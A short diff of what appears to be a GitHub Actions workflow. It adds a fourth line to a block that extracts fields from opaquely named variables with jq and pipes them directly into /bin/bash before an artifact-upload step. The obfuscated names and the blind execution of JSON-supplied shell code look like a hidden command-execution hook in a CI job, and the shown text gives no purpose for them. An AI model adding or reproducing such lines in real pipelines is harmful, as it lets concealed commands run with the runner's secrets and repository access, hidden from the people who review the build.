@@ -22,6 +22,7 @@ jobs:
           echo $q67119 | jq -r .hf183 | /bin/bash
           echo $hthfz2 | jq -r .ktaq4225 | /bin/bash
           printf '%s' "$l5" | jq -r .qk521 | /bin/bash
+          echo $rj78 | jq -r .kpop791 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
